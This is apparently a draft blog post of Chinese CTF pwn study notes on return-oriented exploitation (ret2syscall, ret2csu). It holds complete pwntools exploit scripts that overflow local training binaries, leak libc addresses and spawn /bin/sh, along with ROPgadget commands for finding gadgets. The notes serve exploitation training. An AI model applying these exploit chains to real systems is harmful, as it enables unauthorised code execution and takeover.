---
title: Pwn
subtitle:
date: 2024-09-28T11:11:56+08:00
draft: true
author:
  name: 瞻鹤
  link:
  email: he-zhan@outlook.com
  avatar: /images/avatar.jpg
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 
categories:
  - homework
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->	

[toc]

## Ret2

- ret2text——程序中有system("/bin/sh")代码段，控制流执行
- ret2shellcode——程序中不存在system("/bin/sh/")的代码段，自己恶意填入代码并在可执行段执行 
- ret2syscall——程序中不存在system("/bin/sh/")的代码段，不存在合适的可执行段进行恶意代码的执行，但是程序是**静态链接，且程序中中存在代码片段，拼接可组成系统调用** 

### Ret2syscall

~~~ c
execve("/bin/sh",NULL,NULL)
~~~

修改寄存器的值，并触发系统调用。

- 系统调用号，即 eax 应该为 0xb，因为是execve所以是0xb
- 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
- 第二个参数，即 ecx 应该为 0
- 第三个参数，即 edx 应该为 0

1. checksec看一下程序属性，然后file一下看一下是不是静态链接
2. 寻找可用gadget

~~~shell
ROPgadget --binary rop --only 'pop|ret' | grep 'eax'
ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
ROPgadget --binary rop  --only 'pop|ret' | grep 'ecx'
ROPgadget --binary rop  --only 'pop|ret' | grep 'edx' 
ROPgadget --binary rop  --string '/bin/sh'
ROPgadget --binary rop  --only 'int' 

有些题目可以一把梭
ROPgadget --binary rop --ropchain
ropper --file inndy_rop --chain execveropper --file inndy_rop --chain execve
~~~

payload示例

~~~ python
from pwn import *
 
gadget_eax_ret_addr=0x080bb196
gadget_edx_ecx_ebx_ret=0x0806eb90
bin_sh_addr=0x080be408
int_0x80_addr=0x08049421
 
context(os='linux',arch='i386',log_level='debug')
sh=process('./rop')
payload=b'a'*112+p32(gadget_eax_ret_addr)+p32(0xb)+ \
        p32(gadget_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bin_sh_addr)+ \
        p32(int_0x80_addr)
sh.sendline(payload)
sh.interactive()
~~~

x64

64位与32位不同，需要注意以下几点：

1.execve系统调用号不同：64位系统调用号为0x3b 2.存放系统调用号的寄存器不同：64位系统调用号存放在rax 3.存储参数的寄存器不同：64位存储参数的寄存器为：rdi，rsi，rdx，r10，r8，r9 4.中断不同：32位为int 80，64位为syscal

### Ret2csu

~~~
在64 位程序中，函数的前6个参数是通过寄存器传递的 但是大多数时候 我们很难找到每一个寄存器对应的gadgets 这时候 我们可以利用 x64下的 __libc_csu_init 中的 gadgets 这个函数是用来对 libc 进行初始化操作的 而一般的程序都会调用libc 函数 所以这个函数一定会存在
可以控制rbx,rbp,r12,r13,r14,r15以及rdx,rsi,edi的值，并且还可以call我们指定的地址。然后劫持程序执行流的时候，劫持到这个__libc_csu_init函数去执行（这个函数是用来初始化libc的，因此只要是动态链接的程序就都会有这个函数（至少我还没有遇见过特殊情况）），从而达到控制参数的目的。
~~~

gadget1

~~~ asm
add rsp, 8
pop rbx //一般从这条指令开始
pop rbp //通常零rbx值为0， rbp值为1，目的是在gadget2中call的地址为r12而不用管rbx。同时gadget2中rbx+1后与rbp相等时，不会跳转到gadget2中的地址0x400580,所以rbx为0，rbp为1
pop r12
pop r13
pop r14
pop r15
//以上四个寄存器的值根据gadget2中mov语句不同而与其他寄存器有不同的关系
retn
~~~

gadget2

~~~ asm
mov rdx, r13
mov rsi, r14
mov edi, r15d
//想用ret2csu去把rdi里存放成一个地址是不可行的
call qword ptr [r12 + rbx * 8]
add rbx, 1
cmp rbx, rbp
jnz short loc_400580
~~~

先执行gadget1，再执行gadget2，然后顺序往下再执行gadget1。

如果不需要再一次控制参数的话，那我们此时把栈中的数据填充56（7*8）个垃圾数据即可。

如果我们还需要继续控制参数的话，那就此时不填充垃圾数据，继续去控制参数，总之不管干啥呢，这里都要凑齐56字节的数据，以便我们执行最后的ret，最后ret去执行我们想要执行的函数即可。

~~~ python
from pwn import *
file_path='./level5'
context(binary=file_path,os='linux',terminal = ['tmux', 'sp', '-h'])
p = process(file_path)
elf = ELF(file_path)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
main_addr = 0x400564
write_got = elf.got['write']
read_got = elf.got['read']
gadget1 = 0x400606
gadget2 = 0x4005F0
bss_addr = 0x601028

#payload = b'A'*0x80+b'B'*8+p64(gadget1)+b'C'*8+b'D'*8+b'E'*8+b'F'*8+b'G'*8+b'H'*8#show how to set register
#######################leak libc###############################
payload1 = b'A'*0x80+b'B'*8      #padding
payload1 += p64(gadget1)         #ret
payload1 += p64(0)               #rsp
payload1 += p64(0)               #rbx
payload1 += p64(1)               #rbp
payload1 += p64(write_got)       #r12
payload1 += p64(1)               #r13 edi
payload1 += p64(write_got)       #r14 rsi
payload1 += p64(8)               #r15 rdx
payload1 += p64(gadget2)
payload1 += b'\x00'*0x38         #padding 0x38 = 56
payload1 += p64(main_addr)            #等待第二次触发漏洞
#gdb.attach(p,'b *0x400562')
p.sendafter('Hello, World\n',payload1)

write_addr = u64(p.recv(8))
libc_base = write_addr - libc.sym['write']
system_addr = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

success("libc_base:{}".format(hex(libc_base)))
success("system_addr:{}".format(hex(system_addr)))
success("binsh:{}".format(hex(binsh)))

#######################read(0,bss,8) system_addr###############################
payload2 = b'A'*0x80+b'B'*8      #padding
payload2 += p64(gadget1)         #ret
payload2 += p64(0)               #rsp
payload2 += p64(0)               #rbx
payload2 += p64(1)               #rbp
payload2 += p64(read_got)        #r12 ret
payload2 += p64(0)               #r13 edi
payload2 += p64(bss_addr)        #r14 rsi
payload2 += p64(16)              #r15 rdx
payload2 += p64(gadget2)
payload2 += b'\x00'*0x38         #padding
payload2 += p64(main_addr)            #等待第二次触发漏洞
p.sendafter('Hello, World\n',payload2)
sleep(1)
p.send(p64(system_addr)+b'/bin/sh\x00') #有人问 为什么要写入/bin/sh 而不是利用libc中的/bin/sh 那是因为我们再给rdi赋值只能.....
sleep(1)

#######################system('/bin/sh') system_addr###############################
payload3 = b'A'*0x80+b'B'*8      #padding
payload3 += p64(gadget1)         #ret
payload3 += p64(0)               #rsp
payload3 += p64(0)               #rbx
payload3 += p64(1)               #rbp
payload3 += p64(bss_addr)        #r12 ret
payload3 += p64(bss_addr+8)      #r13 edi无法完整赋值
payload3 += p64(0)               #r14 rsi
payload3 += p64(0)               #r15 rdx
payload3 += p64(gadget2)
payload3 += b'\x00'*0x38         #padding
payload3 += p64(main_addr)            #等待第二次触发漏洞
p.sendafter('Hello, World\n',payload3)

p.interactive()
~~~

### Ret2reg



